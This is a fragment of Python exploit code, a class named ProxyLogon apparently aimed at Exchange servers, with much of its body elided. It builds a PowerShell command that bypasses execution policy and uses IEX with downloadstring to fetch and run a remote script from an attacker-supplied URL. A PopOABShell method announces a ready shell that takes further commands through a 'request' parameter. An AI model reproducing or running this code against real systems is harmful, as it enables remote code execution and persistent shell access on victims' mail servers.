...
class ProxyLogon:
    ...
    def __init__(self, target, user, cmd, revPSScriptUrl):
        ...
        self.ps_script_url = (
            ...
            else "powershell -exec bypass -nop -c IEX (new-object net.webclient).downloadstring('%s') "
            % (revPSScriptUrl)
        )
    ...
    def PopOABShell(self):
        ...
        print("Shell ready, you can post extra commands to this with 'request' parameter:")
